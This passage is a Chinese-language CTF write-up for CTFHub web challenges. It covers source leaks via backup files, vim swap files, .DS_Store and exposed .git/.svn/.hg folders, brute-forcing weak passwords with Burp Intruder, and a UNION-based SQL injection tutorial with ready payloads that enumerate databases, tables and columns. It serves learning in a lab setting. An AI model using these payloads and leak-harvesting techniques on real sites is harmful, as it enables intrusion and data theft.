id="3-备份文件下载">3.备份文件下载</h5><h6 id="1-网站源码">1.网站源码</h6><blockquote><p>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p></blockquote><p>题目</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/information%20leakage/4.png" alt="1.png"></p><p>这个需要使用工具 dirsearch，下载教程及说明 👉<a href="https://www.nonevector.top/posts/18.html">点击直达</a>。</p><p>使用命令(中间的 url 用自己的)对目标 url 目录进行扫描（题目时常 30 分钟我扫了 25 分钟 😅）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://challenge-51c65819981ea505.sandbox.ctfhub.com:10800/ -e tar tar.gz zip rar</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/information%20leakage/5.png" alt="6.png"></p><p>扫完后找状态码为 200 的，可以找到一个压缩包：www.zip<br>把它<strong>添加到 url</strong>中回车发现网站下载下来了一个压缩包，打开后发现里面有一个 flag_133317377.txt，兴奋的打开它却发现没有 flag。。。</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/information%20leakage/6.png" alt="7.png"></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/information%20leakage/7.png" alt="8.png"></p><p>我又尝试在网页上访问它（在网页原 url 后加上/后再加上 flag_133317377.txt 即可），flag 出来了！！<br><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/information%20leakage/8.png" alt="9.png"></p><h6 id="2-bak-文件">2.bak 文件</h6><blockquote><p>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p></blockquote><p>看到这题我第一时间以为加个 index.php 就行了，但是一点反应都没有</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/information%20leakage/10.png" alt="10.png"></p><p>老老实实用 dirsearch</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://**** -e *</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/information%20leakage/9.png" alt="11.png"></p><p>顺带一提因为我是-e *全搜，导致我 30 分钟都不够，好在提前扫出来了 😅</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/information%20leakage/12.png" alt="13.png"></p><p><s>不过没想到仅仅是后加了个 bak😡，早知道就试试了</s></p><p>url 加上 index.php.bak 会自动下载一个文件，用记事本打开就行</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/information%20leakage/13.png" alt="13.png"></p><h6 id="3-vim-缓存">3.vim 缓存</h6><blockquote><p>当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当 vim 异常退出时，缓存会一直留在服务器上，引起网站源码泄露。</p></blockquote><p>此题目需要用到 Linux 和 vim,这个没有的话需要自己去安装虚拟机</p><p>做这题需要前置知识</p><ul><li><p>当 vim 在编辑文档的过程中如果异常退出，则会产生缓存文件。第一次产生的缓存文件后缀为.swp，第二次则产生的缓存文件后缀为.swo,第三次产生的缓存文件后缀为.swn。</p></li><li><p>使用命令 vim -r 可以查看当前目录下的所有 swp 文件。</p></li><li><p>使用命令 vim -r filename 可以恢复文件，这样上次意外退出并且没有保存的修改，就可以覆盖文件。</p></li><li><p>调用这类的隐藏文件的时候，需要在最前面加.(如删除 index.php.swp，则需要 rm -fr* .index.php.swp).</p></li><li><p>vim 使用的缓存存储是一种固定的二进制文件，我们可以通过 curl 命令，或者 vim 命令进行查看。</p></li></ul><p>所以我们自需要在路径上加上<code>/index.php.swp</code>,就会自动下载文件了，主要是用 vim 打开,在文件所在路径使用命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim -r index.php.swp</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/information%20leakage/14.png" alt="14.png"></p><h6 id="4-DS-Store">4. .DS_Store</h6><blockquote><p>.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store 可以知道这个目录里面所有文件的清单。</p></blockquote><p>老样子先加路径（终于对了一次），虽然出现 404 但是文件下载下来了</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/information%20leakage/15.png" alt="15.png"></p><p>用记事本打开，发现一串神秘数字（注意这个由于一行太长有一段字母在右边<s>出题人的恶趣味 😅</s>）</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/information%20leakage/17.png" alt="16.png"></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/information%20leakage/18.png" alt="17.png"></p><p>然后就是在 url 后面添加一个一个输入除了最后的 noteustr，输到 txt 就行，而且注意不能有空格</p><p>最后就会得到 flag</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/information%20leakage/16.png" alt="18.png"></p><h5 id="4-Git-泄露">4.Git 泄露</h5><p>有关 git 知识大伙请自行上网搜索，这里不再赘述</p><h6 id="1-Log">1.Log</h6><blockquote><p>当前大量开发人员使用 git 进行版本控制，对站点自动部署。如果配置不当,可能会将.git 文件夹直接部署到线上环境。这就引起了 git 泄露漏洞。请尝试使用 BugScanTeam 的 GitHack 完成本题</p></blockquote><p>其实主要就是要使用 GitHack，先进入 GitHack 文件夹，命令很简单</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py URL/.git</span><br></pre></td></tr></table></figure><p>注意 URL 是自己的网站 URL，然后就是得用 python2</p><p>然后就会在 dist 文件夹得到文件</p><p>用指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -a</span><br></pre></td></tr></table></figure><p>可以看到.git 文件</p><p>然后用 git 命令看版本有一个是“add flag”</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git reflog # 显示每次git的版本</span><br><span class="line">git reset --hard hash # 跳转到指定版本，hash就是git reflog出现的黄子</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/information%20leakage/19.png" alt="19.png"></p><p>跳转后就会出现 flag 文件</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/information%20leakage/20.png" alt="20.png"></p><h6 id="2-Stash">2.Stash</h6><p><a href="https://zhuanlan.zhihu.com/p/117553180">关于 Stash</a></p><p>简单来说就是其将当前未提交的修改(即，工作区的修改和暂存区的修改)先暂时储藏起来</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">简单命令</span></span><br><span class="line"></span><br><span class="line">git stash list  # 查看储藏记录列表</span><br><span class="line">git stash show -p  #用于显示第一个存储的改动</span><br><span class="line">git stash show stash@&#123;$num&#125; -p  #显示其他存存储，命令：比如第二个：git stash show stash@&#123;1&#125; -p</span><br></pre></td></tr></table></figure><p>这题和上面一题开头不走一致</p><p>只是打开 flag 文件并没有看到 flag<s>屁话题目都告诉是 stash</s></p><p>现在就使用<code>git stash list</code> 用于查看 stash 了哪些存储，先输入康康：</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/information%20leakage/21.png" alt="21.png"></p><p>再用<code>git stash show -p</code>查看 stash 就行</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/information%20leakage/22.png" alt="22.png"></p><h6 id="3-Index">3.Index</h6><p>这题没有发现和第一题有什么不同。。。</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/information%20leakage/23.png" alt="23.png"></p><h5 id="5-SVN-泄露">5.SVN 泄露</h5><blockquote><p>当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn 文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。</p></blockquote><p>svn 和 git 差不多，这里不再过多赘述介绍</p><p>其实和 git 一样都有专门的漏洞脚本</p><p>在 devs-ripper 文件下使用命令，脚本运行成功后会出现.svn 文件，进入文件，一个一个找就行了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./rip-svn.pl -u URL/.svn</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/information%20leakage/26.png" alt="25.png"></p><p>cat 命令可以看文件内容</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/information%20leakage/25.png" alt="24.png"></p><h5 id="6-HG-泄露">6.HG 泄露</h5><blockquote><p>当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。</p></blockquote><p>hg 和 svn 和 git 差不多，这里不再过多赘述介绍</p><p>同样使用 devs-ripper 就行了，命令稍微改一下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./rip-hg.pl -v -u URL/.hg/</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/information%20leakage/28.png" alt="26.png"></p><p>老样子一个一个搜，突然发现一个熟悉的 flag 文件，把它加到网站后缀就自动出现 flag 了</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/information%20leakage/27.png" alt="27.png"></p><h4 id="2-密码口令">2.密码口令</h4><h5 id="1-弱口令">1.弱口令</h5><blockquote><p>通常认为容易被别人（他们有可能对你很了解）猜测到或被破解工具破解的口令均为弱口令。</p></blockquote><p>这里还是得用burp的Intruder进行爆破密码</p><p>随便输入用户名密码（一般用户名都是admin）</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/password/1.png" alt="1"></p><p>最下面一行就是我刚才输入的name和password（referer是那个记住密码不用管），发送给Intruder模块</p><p>注意我们这里只对密码部分进行了攻击，所以先点击右边的clear后对密码部分进行add</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/password/9.png" alt="2"></p><p>添加字典，然后攻击</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/password/2.png" alt="3"></p><p>点击length进行排序（一般就是长度最长或最短的密码）</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/password/3.png" alt="5"></p><p>可以发送给repeater部分点击send看源码或者直接将找的的密码输入就可以看到flag</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/password/4.png" alt="5"></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/password/5.png" alt="6"></p><h5 id="2-默认口令">2.默认口令</h5><blockquote><p>默认口令，就是公司内部一些人员为了方便而设计的默认用户名和密码，那么我只要用这些直接登录就可以了。</p></blockquote><p>这个只需要上网百度自己去找就行了</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/password/7.png" alt="9"></p><p>这里我就给出结果以及我搜到的大佬整理的默认口令</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/password/8.png" alt="10"></p><p><a href="https://blog.csdn.net/m0_51191308/article/details/127419411?spm=1001.2014.3001.5502">常见安全产品系统默认口令</a></p><p>大佬把文件放在github，我们直接git clone</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">git</span>@github.com:NepoloHebo/Common-device-default-password.git</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/password/6.png" alt="7"></p><h4 id="3-SQL-注入">3.SQL 注入</h4><p>SQL注入分类：</p><ul><li>回显正常—&gt; 联合查询 union select</li><li>回显报错—&gt; Duplicate entry()<br>extractvalue()<br>　　       updatexml()</li><li>盲注    —&gt;布尔型盲注<br>基于时间的盲注sleep()</li></ul><p>首先声明一下，本人只听过注入的鼎鼎大名，实操肯定不行，因此我都是辅大佬的write up写的，但是我认为正因为我的基础是0，我会在一些细微（大佬默认我会但我不会）的地方加上自己的理解(大多会写在下面的知识基础里面），如果你有自己的理解，欢迎交流</p><p>以下是我看过的writeup（放在后面怕看不到）</p><p><a href="https://blog.csdn.net/m_de_g/article/details/119151644">CTFHUB-SQL注入_ctfhub sql注入-CSDN博客</a></p><p><a href="https://www.cnblogs.com/wjw-zm/p/12670106.html">CTFHub 整数型SQL注入 - ZM思 - 博客园 (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/weixin_45808483/article/details/121347677">CTFHub技能树 Web-SQL注入 详解_ctfhub web sql注入-CSDN博客</a></p><p><a href="https://blog.csdn.net/weixin_46703850/article/details/114792127">Ctfhub解题 web SQL注入(全部完整版)-CSDN博客</a></p><p><a href="https://www.freebuf.com/articles/web/304983.html">ctfhub_web_SQL注入_全通关详解(持续更新中) - FreeBuf网络安全行业门户</a></p><p><a href="https://blog.csdn.net/weixin_51830687/article/details/122152436">CTFHub——技能树——SQL注入（sqlmap）_ctfhub sqlmap-CSDN博客</a></p><p><a href="https://zhuanlan.zhihu.com/p/339567787">手撕CTFHub-Web(四)：SQL注入 - 知乎 (zhihu.com)</a></p><p><a href="https://blog.csdn.net/Cypher_X/article/details/119909526">关于SQL中group by主键重复报错注入 适用版本问题的探讨_strem groupby 报主键重复-CSDN博客</a></p><p><a href="https://blog.csdn.net/Cypher_X/article/details/119912220">CTFHUB——SQL 报错注入三种方法全解_ctfhub报错注入-CSDN博客</a></p><p><a href="https://blog.csdn.net/sinat_36711025/article/details/104857541">CTFHub 字符型SQL注入_ctfhub字符型注入-CSDN博客</a></p><p><a href="https://www.cnblogs.com/0yst3r-2046/p/12469632.html">CTFHub题解-技能树-Web-SQL注入(整数型、字符型、报错注入、布尔盲注)【一】 - 0yst3r - 博客园 (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/m_de_g/article/details/119151644">CTFHUB-SQL注入_ctfhub sql注入-CSDN博客</a></p><p><a href="https://www.cnblogs.com/wjw-zm/p/12670106.html">CTFHub 整数型SQL注入 - ZM思 - 博客园 (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/weixin_51563603/article/details/120101532">CTF之旅（CTFHub技能树+详细Write up+持续更新ing)（SQL注入）-CSDN博客</a></p><h5 id="知识基础">知识基础</h5><h6 id="0-bug工具sqlmap">0.bug工具sqlmap</h6><p><a href="https://www.cnblogs.com/php09/p/10404560.html">sqlmap基础入门超详细教程</a></p><p>小白最喜欢的一集🤣，直接利用这个渗透测试工具可完成注入（当然明白原理更好）</p><blockquote><p>指令参数的含义我上面的工具里面全写了，下面我看情况会重复提心一下</p></blockquote><p>sqlmap支持五种不同的注入模式：</p><p>1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。<br>2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。<br>3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。<br>4、联合查询注入，可以使用union的情况下的注入。<br>5、堆查询注入，可以同时执行多条语句的执行时的注入</p><h6 id="1-介绍SQL注入">1.介绍SQL注入</h6><p>SQL注入就是指WEB应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数代入数据库查询，攻击者可以通过构造不同的SQL语句来是实现对数据库的任意操作。</p><p>一般情况下，开发人员可以使用动态SQL语句创建通用、灵活的应用。动态SQL语句是在执行过程中构造的，他根据不同的条件产生不同的SQL语句。当开发人员在运行过程中需要根据不同的查询标准决定提取什么字段(如select语句)，或者根据不同的条件选择不同的查询表时，动态的SQL语句会非常有用。</p><p>下面以PHP语句为例。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">&quot;SELECT * FROM user WHERE id = $_GET[&#x27;id&#x27;]&quot;</span>;</span><br></pre></td></tr></table></figure><p>由于这里的参数ID可控，且带入数据库查询，所以非法用户可以任意拼接SQL语句进行攻击。</p><h6 id="2-SQL注入的原理">2.SQL注入的原理</h6><p>SQL注入漏洞的产生需要满足以下两个条件。<br>(1)参数用户可控：前端传给后端的参数内容是用户可以控制的。<br>(2)参数代入数据库查询：传入的参数拼接到SQL语句，且带入数据库查询。<br>当传入的ID参数为1’时，数据库执行的代码如下所示。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id = 1&#x27;</span><br></pre></td></tr></table></figure><p>这不符合数据库的语法规范(单引号数量为奇数，不闭环），所以会报错。当传入的ID参数为and 1=1时，执行的SQL语句如下所示。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and 1=1</span><br></pre></td></tr></table></figure><p>因为1=1为真，且where语句中id=1也为真，所以页面会返回与id=1相同的结果。当传入的ID参数为and 1=2时，由于1=2不成立，所以返回假，页面就会返回与id=1不同的结果。</p><p>在实际环境中，凡是满足上述两个条件的参数皆可能存在SQL注入漏洞，因此开发者需秉承&quot;外部参数皆不可信的原则&quot;进行开发。</p><h6 id="3-information-schema">3.information_schema</h6><p>在<strong>MYSQL5.0版本</strong>之后，MySQL默认在数据库中存放一个&quot;information_schema&quot;的数据库，在该库中，需要记住三个表名，分别是SCHEMATA、TABLES和COLUMNS。<br>SCHEMATA表存储该用户创建的所有数据库名的库名。</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/basic/1.png" alt="1"></p><p>TABLES表存储该用户创建的所有的数据库的库名和表名，库名为：<code>TABLES_SCHEMA</code>，表名为：<code>TABLE_NAME</code>，字段名为：<code>COLUMN_NAME</code>.</p><h6 id="4-MySQL查询语句">4.MySQL查询语句</h6><p>在不知道任何条件时，语句如下所示。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 查询的字段名 from 库名.表名</span><br></pre></td></tr></table></figure><p>在知道一条已知条件时，语句如下所示。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 要查询的字段名 from 库名.表名 where 已知条件的字段名=&#x27;已知条件的值&#x27;</span><br></pre></td></tr></table></figure><h6 id="5-limit的用法">5.limit的用法</h6><p>limit的使用格式为limit m,n,其中m是指记录开始的位置，从0开始，表示第一条记录；n是指n条记录。</p><p>例如limit 0,1表示从第一条记录开始，取一条记录，不使用limit和使用limit查询的结果</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/basic/2.png" alt="2"></p><h6 id="6-注释符">6.注释符</h6><p>在MySQL中，常见注释符的表达方式：<code>#或--空格或/**/</code>。</p><h6 id="7-内联注释">7.内联注释</h6><p>内联注释的形式:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/*!code*/</span><br></pre></td></tr></table></figure><p>内联注释可以用于整个sql语句中，用来执行SQL语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 /*!union*/ /*!select*/ 1,2,3</span><br></pre></td></tr></table></figure><h6 id="8-需要记住的函数">8.需要记住的函数</h6><p><code>database()</code> 当前网站使用的数据库<br><code>version()</code> 当前MySQL的版本<br><code>user()</code> 当前MySQL的用户</p><h6 id="9-order-by">9.order by</h6><p>正常的作用是让一列的数据按一定规则排序（递增，递减）</p><p>order by 列名（列名可以为select语句中列的序号,name,age——-&gt;1,2），因此数字从大往小猜，如果超出它的列数，则报错；如果恰好等于列数，显示$name=1的结果。</p><p>$name=1’ order by 3 – '，sql语句为：select * from news where id=‘1’ order by 3 – ‘’，超过它的列数，报错。继续往小猜。猜到2时可以正常显示，因此字段数量为2</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果能正常返回结果意思是按第2列的样子排序，即至少有2列</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">反之如果错误即只有1列</span></span><br><span class="line">select * from news where id=1 order by 2 </span><br></pre></td></tr></table></figure><h6 id="10-union">10.union</h6><p>它能够将两个或多个 SELECT 查询的结果合并在一起，并返回一个单一的结果集。具体来说，<code>UNION</code>会去除重复的数据，只返回唯一的行。</p><p>使用 <code>union select</code> 语句来执行自定义的 SQL 查询，从而绕过应用程序的验证机制，并获取到敏感信息。</p><p>其实就是使用union联合查询检测信息回显位置，利用信息回显位置进行注入攻击</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from news where id = -1 union select 1, 2</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">因为如果news 表中的 <span class="built_in">id</span> 列是整数类型，那么 <span class="built_in">id</span> = -1 应该返回空结果集，因为不存在 <span class="built_in">id</span> 为负数的记录。</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果 union <span class="keyword">select</span> 1, 2 能够返回数据，那么这意味着应用程序没有正确处理或过滤用户输入，从而允许攻击者执行自定义的 SQL 查询。</span></span><br></pre></td></tr></table></figure><p>注意！！！</p><blockquote><p>Remember that when using an UNION each SELECT statement within UNION must have the same number of columns.</p><p>请记住，在使用UNION时，UNION中的每个SELECT语句必须具有相同数量的列。</p></blockquote><p>比如说</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from news where id = 1 union select 1, 2</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">前一个查询结果会返回两列，后面也需要两个值作为列名</span></span><br></pre></td></tr></table></figure><h6 id="11-concat">11.concat</h6><p><code>CONCAT</code> 是一个 SQL 函数，用于将多个字符串值连接成一个字符串。它通常用于将多个列或字符串值连接起来，以产生一个完整的字符串。</p><p><code>CONCAT</code> 函数的基本语法如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONCAT(string1, string2, ..., stringN)</span><br></pre></td></tr></table></figure><p>其中，<code>string1</code>、<code>string2</code> 等是你要连接的字符串或列名。</p><p>例如，假设你有一个名为 <code>employees</code> 的表，其中包含 <code>first_name</code> 和 <code>last_name</code> 两个列，你可以使用以下查询来连接这两个列：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> CONCAT(first_name, <span class="string">&#x27; &#x27;</span>, last_name) <span class="keyword">AS</span> full_name <span class="keyword">FROM</span> employees;</span><br></pre></td></tr></table></figure><p>这将返回一个名为 <code>full_name</code> 的新列，其中包含 <code>first_name</code> 和 <code>last_name</code> 列中的值，用空格分隔。</p><h6 id="12-group-concat">12.group_concat</h6><p><code>GROUP_CONCAT</code> 主要用于将多个行的值连接成一个字符串。这个函数通常与 <code>GROUP BY</code> 子句一起使用，以便将分组后的值连接在一起。</p><p>假设有一个表</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+----+---------+  </span><br><span class="line">| id | name    |  </span><br><span class="line">+----+---------+  </span><br><span class="line">| 1  | Alice   |  </span><br><span class="line">| 2  | Bob     |  </span><br><span class="line">| 3  | Charlie |  </span><br><span class="line">+----+---------+</span><br></pre></td></tr></table></figure><p>如果你想获取所有学生的名字，并用逗号分隔，你可以使用以下查询：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT GROUP_CONCAT(name SEPARATOR &#x27;, &#x27;) AS student_names  </span><br><span class="line">FROM students;</span><br></pre></td></tr></table></figure><blockquote><p>使用 <code>GROUP_CONCAT</code> 时，确保在连接的值中没有特殊字符或保留字，否则可能会导致错误或不预期的结果。</p></blockquote><h5 id="1-整数型注入">1.整数型注入</h5><p>根据我看了多达十多篇的writeup，还是有不同的地方比如指令不通，工具不通，我来总结一下答案，虽然思想大差不差，但对我来说还是开拓了思路</p><h6 id="1-手工注入">1.手工注入</h6><p><strong>1.判断是否存在注入</strong></p><p><s>虽然题目已经说了整数型注入</s></p><p>1）加单引号</p><p>对应的sql：select * from table where id=3’ 这时sql语句出错，程序无法正常从数据库中查询出数据，就会抛出异常；</p><p>2）加and 1=1</p><p>对应的sql：select * from table where id=3 and 1=1 语句执行正常，与原始页面如任何差异；</p><p>3）加and 1=2</p><p>对应的sql：select * from table where id=3 and 1=2 语句可以正常执行，但是无法查询出结果，所以返回数据与原始网页存在差异</p><p>即说明存在</p><p><strong>2.查询字段数量</strong></p><p>当id=1 order by 2时，页面返回与id=1相同的结果；而id=1 order by 3时没有显示，故字段数量是2。</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/int/5.png" alt="1"></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/int/6.png" alt="2"></p><p><strong>3.利用回显信息SQL语句插入位置</strong></p><p>此时要先保证之前的数据查不出来，id=-1数据不存在数据库中，之后再union 。可以看到存在两个注入点（可以看到回显信息，即注入点）。利用注入点进行爆库。</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/int/7.png" alt="3"></p><p><strong>4.获取数据库库名</strong></p><p>两种办法</p><p>a.在注入点换成函数database()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,database()</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/int/8.png" alt="4"></p><p>b.利用group_concat直接获取全部</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,group_concat(schema_name)from information_schema.schemata</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/int/1.png" alt="5"></p><p>爆库成功，知道库名为:<code>sqli</code>，爆表</p><p><strong>5.获取数据库表名</strong></p><p>两种办法</p><p>a.利用limit一个一个查，第一条limit 0,1;没找到就换成limit 1,1;以此类推</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,(select table_name from information_schema.tables where table_schema=&#x27;sqli&#x27; limit 0,1)</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/int/9.png" alt="6"></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/int/10.png" alt="7"></p><p>b.利用group_concat直接获取全部</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;sqli&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/int/2.png" alt="8"></p><p>知道表名为:<code>news</code>和<code>flag</code>，爆字段名</p><p><strong>6.获取字段名</strong></p><p>两种办法</p><p>a.利用limit一个一个查，第一条limit 0,1;没找到就换成limit 1,1;以此类推</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,(select column_name from information_schema.columns where table_schema=&#x27;sqli&#x27; and table_name=&#x27;flag&#x27; limit 0,1)</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/int/11.png" alt="9"></p><p>b.利用group_concat直接获取全部</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#x27;sqli&#x27; and table_name=&#x27;flag&#x27;</span><br></pre></td></tr></table></figure><p><img 